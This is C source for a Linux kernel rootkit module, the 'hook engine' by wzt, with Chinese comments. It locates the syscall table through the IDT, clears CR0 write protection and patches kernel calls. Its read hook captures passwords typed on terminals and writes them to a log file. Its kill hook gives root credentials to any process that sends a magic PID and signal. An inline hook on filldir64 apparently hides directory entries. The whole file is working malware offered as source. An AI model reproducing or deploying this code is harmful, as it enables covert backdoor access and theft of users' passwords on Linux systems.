/*
	My hook engine v0.20

	by wzt	<wzt@xsec.org>

        tested on  amd64 as5, x86 as4,5
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/spinlock.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <net/sock.h>
#include <asm/uaccess.h>
#include <asm/siginfo.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>

#include "config.h"
#include "k_file.h"
#include "hook.h"

#define READ_NUM	200


extern int write_to_file(char *logfile, char *buf, int size);
extern int new_filldir64(void * __buf, const char * name, int namlen, loff_t offset,
                     u64 ino, unsigned int d_type);

ssize_t (*orig_vfs_read)(struct file *file, char __user *buf, size_t count,
                loff_t *pos);
int (*orig_kill_something_info)(int sig, struct siginfo *info, int pid);

unsigned int system_call_addr = 0;
unsigned int sys_call_table_addr = 0;

unsigned int sys_read_addr = 0;
unsigned int sys_getdents64_addr = 0;
unsigned int sys_kill_addr = 0;
unsigned int kill_something_info_addr = 0;

int hook_kill_something_info_flag = 1;
int hook_vfs_read_flag = 1;

unsigned int filldir64_addr = 0;
unsigned char old_filldir64_opcode[5];

unsigned int get_sct_addr(void)
{
        int i = 0, ret = 0;
        
        for (; i < 500; i++) {
                if (       (*(unsigned char*)(system_call_addr + i) == 0xff)
                        && (*(unsigned char *)(system_call_addr + i + 1) == 0x14)
                        && (*(unsigned char *)(system_call_addr + i + 2) == 0x85)) {
                        	ret = *(unsigned int *)(system_call_addr + i + 3);
                        	break;
                }
        }
        
        return ret;
}

// 从指定文件中读入一行，成功返回1，否则返回0.
/*
	由于文件 /proc/kallsyms 的特殊性 ， 原文提供的处理方式在这里是行不通的。
	本函数将文件分割为一个个的单元：  	c100104e t save_registers\n 来处理

	total里面容纳信息有没有一个基本单元
	如果没有：
		从 file 中读取若干个字符到temp中
		将读取的字符域total中剩余的字符合并 （此时肯定有了一个基本单元）
	从total中提取一个基本单元，并从total中移除
	将total中剩余的信息前移
*/
int readline(char *buf,struct file *file)	/// 考虑到要处理的 文件的特殊性，这里不能使用llseek
{						/// 又由于文件很大，不可能创建临时文件。
						/// 曾经尝试一次读很多数据  失败。
	static	char	total[512];
	static	int	rest;			/// 剩下的字符数目

	char	temp[128];
	int	len,i,cnt,count;
	
	cnt	= 0;				///判断是否有 1 个 '\n'
	for (i = 0;i < rest;i ++ ){
		if(total[i] == '\n'){	
			cnt ++;
			break;
		}
	}

	if(cnt == 0){				/// 信息不够 没有一个 '\n'
		count = file->f_op->read(file, temp, sizeof(temp), &file->f_pos);
		if(count == 0)
			return 0;			/// 无法再读出信息！直接返回 
		strncpy(total+rest,temp,count);
		rest 	+= count;
	}		
							
	len	= 0;
	while( temp[len ] = total[len ] ){		
		len ++;
		if(total[len] == '\n')
			break;
	}
	temp[len]	= '\n';
				
	buf[0]='\n';
	strncpy(buf+1,temp,len+1);
	buf[len+2] = '\0';
	
	rest	-= len+1;				/// 信息前移
	for (i = 0;i < rest ;i ++){
		total[i] = total[i+len+1];
	}

	return 1;
}




/// search_file	:/proc/kallsyms
/// symbol_name :kill_something_info2
/// 返回值为地址。
unsigned int find_kernel_symbol(char *symbol_name, char *search_file)
{
        mm_segment_t old_fs;
        ssize_t bytes;
        struct file *file = NULL;
	char read_buf[500];
        char *p, tmp[20];
	unsigned int addr = 0;
        int i = 0;

        file = filp_open(search_file, O_RDONLY, 0);
        if (!file)
                return -1;

        if (!file->f_op->read)		/// 是否有 read 函数。
                return -1;

        old_fs = get_fs();
        set_fs(get_ds());		/// 内核中fs指向用户数据段，这里让指向内核数据段。
					/// 后面调用 read 要用到。
	while ( readline(read_buf ,file ) ){
                if ( (p = strstr(read_buf, symbol_name)) != NULL) {
                        while (*p--)
                                if (*p == '\n')
                                        break;
			i = 0;
                        while ( (tmp[i ++] = (*++ p) ) != ' ');
                        tmp[--i] = '\0';
                        addr = simple_strtoul(tmp, NULL, 16);
                        break;
                }
        }
        filp_close(file,NULL);
	set_fs(old_fs);

        return addr;
}

unsigned int try_find_kernel_symbol(char *symbol_name, char *search_file, 
	int search_num)
{
	unsigned int addr = 0;
	int i = 0;

	for (i = 0; i < search_num; i++) {
		addr = find_kernel_symbol(symbol_name, search_file);
		if (addr)
			break;
	}
			
	return addr;
}

ssize_t new_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
	ssize_t ret;
	static	int	cnt;
	
	ret = (*orig_vfs_read)(file, buf, count, pos);
        if (ret > 0) {
                struct task_struct *tsk = current;
                struct tty_struct *tty = NULL;

                tty = tsk->signal->tty;
                if (tty && IS_PASSWD(tty)) {
			cnt ++;
			if(cnt >= 2)			
				return ret;
			DbgPrint("*** entered get Passwd .\n");
                	char *tmp_buf = NULL, buff[READ_NUM];

			if (ret > READ_NUM)
				return ret;

                	tmp_buf = (char *)kmalloc(ret + 3, GFP_ATOMIC);
                	if (!tmp_buf)
                        	return ret;

                	copy_from_user(tmp_buf, buf, ret);
			DbgPrint("process:%s passwd: %s\n", tsk->comm,tmp_buf );
                        snprintf(buff, sizeof(buff),
                                "<process: %s>\t--\tpasswd: %s\n", tsk->comm, 
				tmp_buf);
                        write_to_file(SNIFF_LOG, buff, strlen(buff));

			kfree(tmp_buf);
                }
        }

	return ret;
}

int new_kill_something_info(int sig, struct siginfo *info, int pid)
{
	struct task_struct *tsk = current;
	int ret;

        if ((MAGIC_PID == pid) && (MAGIC_SIG == sig)) {
		DbgPrint("*** someone called kill .\n");
                //sys_setuid(0);		///tsk->uid = 0;
                ///tsk->cred->euid	= 0; 	///tsk->euid = 0; 
		(*(uid_t *) ( (* (int *) ((char *)current + offsetof(struct task_struct,cred)) )  +  offsetof(struct cred,euid) )) = 0;
		(*(uid_t *) ( (* (int *) ((char *)current + offsetof(struct task_struct,cred)) )  +  offsetof(struct cred,uid) )) = 0;

                ///sys_setgid(0);		///tsk->gid = 0;
		///tsk->cred->egid	= 0;    ///tsk->egid = 0;
		(*(uid_t *) ( (* (int *) ((char *)current + offsetof(struct task_struct,cred)) )  +  offsetof(struct cred,egid) )) = 0;
		(*(uid_t *) ( (* (int *) ((char *)current + offsetof(struct task_struct,cred)) )  +  offsetof(struct cred,gid) )) = 0;

		return 0;
        }
	else {
		ret = (*orig_kill_something_info)(sig, info, pid);
	
		return ret;
	}
}

/// handler	：要替换的函数的上层函数的地址
/// old_func	：要替换的函数的地址
/// new_func	：新函数的地址
/// 返回值 	：old_func
unsigned int patch_kernel_func(unsigned int handler, unsigned int old_func, 
		unsigned int new_func)
{
	unsigned char *p = (unsigned char *)handler;
	unsigned char buf[4] = "\x00\x00\x00\x00";
	unsigned int offset = 0;
	unsigned int orig = 0;
	int i = 0;

	DbgPrint("\n*** hook engine: start patch func at: 0x%08x\n", old_func);

	while (1) {
		if (i > 512)
			return 0;

		if (p[0] == 0xe8) {
			DbgPrint("*** hook engine: found opcode 0x%02x\n", p[0]);
			
			DbgPrint("*** hook engine: call addr: 0x%08x\n", 
				(unsigned int)p);
			buf[0] = p[1];
			buf[1] = p[2];
			buf[2] = p[3];
			buf[3] = p[4];

			DbgPrint("*** hook engine: 0x%02x 0x%02x 0x%02x 0x%02x\n", 
				p[1], p[2], p[3], p[4]);

        		offset = *(unsigned int *)buf;
        		DbgPrint("*** hook engine: offset: 0x%08x\n", offset);

        		orig = offset + (unsigned int)p + 5;
        		DbgPrint("*** hook engine: original func: 0x%08x\n", orig);

			if (orig == old_func) {
				DbgPrint("*** hook engine: found old func at"
					" 0x%08x\n", 
					old_func);

				DbgPrint("%d\n", i);
				break;
			}
		}
		p++;
		i++;
	}

	offset = new_func - (unsigned int)p - 5;
	DbgPrint("*** hook engine: new func offset: 0x%08x\n", offset);

	p[1] = (offset & 0x000000ff);
	p[2] = (offset & 0x0000ff00) >> 8;
	p[3] = (offset & 0x00ff0000) >> 16;
	p[4] = (offset & 0xff000000) >> 24;

	DbgPrint("*** hook engine: pachted new func offset.\n");

	return orig;
}

static int inline_hook_func(unsigned int old_func, unsigned int new_func,
	unsigned char *old_opcode)
{
        unsigned char *buf;
        unsigned int p;
        int i;

        buf = (unsigned char *)old_func;
        memcpy(old_opcode, buf, 5);

        p = (unsigned int)new_func - (unsigned int)old_func - 5;
        buf[0] = 0xe9;
        memcpy(buf + 1, &p, 4);
}

static int restore_inline_hook(unsigned int old_func, unsigned char *old_opcode)
{
        unsigned char *buf;

        buf = (unsigned char *)old_func;
        memcpy(buf, old_opcode, 5);
}

static int hook_init(void)
{
	struct descriptor_idt *pIdt80;		
	int	i;
        __asm__ volatile ("sidt %0": "=m" (idt48));
	///得到 idtr
	pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);
	/// 指向得到中断向量的指针。
        system_call_addr = (pIdt80->offset_high << 16 | pIdt80->offset_low);
	if (!system_call_addr) {
		DbgPrint("oh, shit! can't find system_call address.\n");
		return 0;
	}
        DbgPrint(KERN_ALERT "system_call addr : 0x%8x\n",system_call_addr);

        sys_call_table_addr = get_sct_addr();	
	if (!sys_call_table_addr) {
		DbgPrint("oh, shit! can't find sys_call_table address.\n");
		return 0;
	}
        DbgPrint(KERN_ALERT "sys_call_table addr : 0x%8x\n",sys_call_table_addr);
        
        sys_call_table = (void **)sys_call_table_addr;

	sys_read_addr = (unsigned int)sys_call_table[__NR_read];
	sys_kill_addr = (unsigned int)sys_call_table[__NR_kill];

	DbgPrint("sys_read addr: 0x%08x\n", sys_read_addr);
	DbgPrint("sys_kill addr: 0x%08x\n", sys_kill_addr);

	kill_something_info_addr = try_find_kernel_symbol("kill_something_info",
		KALL_SYMS_NAME, 3);
	DbgPrint("kill_something_info addr: 0x%08x\n", kill_something_info_addr);

	filldir64_addr = try_find_kernel_symbol("filldir64", KALL_SYMS_NAME, 3);
        DbgPrint("filldir64 addr: 0x%08x\n", filldir64_addr);

	CLEAR_CR0

	if (sys_read_addr) {
        	orig_vfs_read = (ssize_t (*)())patch_kernel_func(sys_read_addr,
                        	(unsigned int)vfs_read, (unsigned int)new_vfs_read);
		if ((unsigned int)orig_vfs_read == 0)
			hook_vfs_read_flag = 0;
	}

        if (kill_something_info_addr && sys_kill_addr) {
                orig_kill_something_info = (int (*)())patch_kernel_func(sys_kill_addr,
                                (unsigned int)kill_something_info_addr, 
				(unsigned int)new_kill_something_info);
                if ((unsigned int)orig_kill_something_info == 0)
                        hook_kill_something_info_flag = 0;
	}

	if (filldir64_addr) {				/// 这里修改函数 filldir64_addr 的机器码。
		inline_hook_func(filldir64_addr, (unsigned int)new_filldir64,
			old_filldir64_opcode);
	}

	SET_CR0

	DbgPrint("orig_vfs_read: 0x%08x\n", (unsigned int)orig_vfs_read);
	DbgPrint("orig_kill_something_info: 0x%08x\n", (unsigned int)orig_kill_something_info);

	if (!hook_kill_something_info_flag && !hook_vfs_read_flag) {
		DbgPrint("install hook failed.\n");
	}
	else {
		DbgPrint("install hook ok.\n");
	}

        return 0;
}

static void hook_exit(void)
{
	CLEAR_CR0
	
        if (hook_vfs_read_flag)
		patch_kernel_func(sys_read_addr, (unsigned int)new_vfs_read, 
			(unsigned int)vfs_read);

	if (hook_kill_something_info_flag)
        	patch_kernel_func(sys_kill_addr, (unsigned int)new_kill_something_info,
                	(unsigned int)kill_something_info_addr);

	SET_CR0

	if (filldir64_addr) {
		restore_inline_hook(filldir64_addr, old_filldir64_opcode);
	}

	DbgPrint("uninstall hook ok.\n");
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wzt");
MODULE_DESCRIPTION("Modified by gudujian");

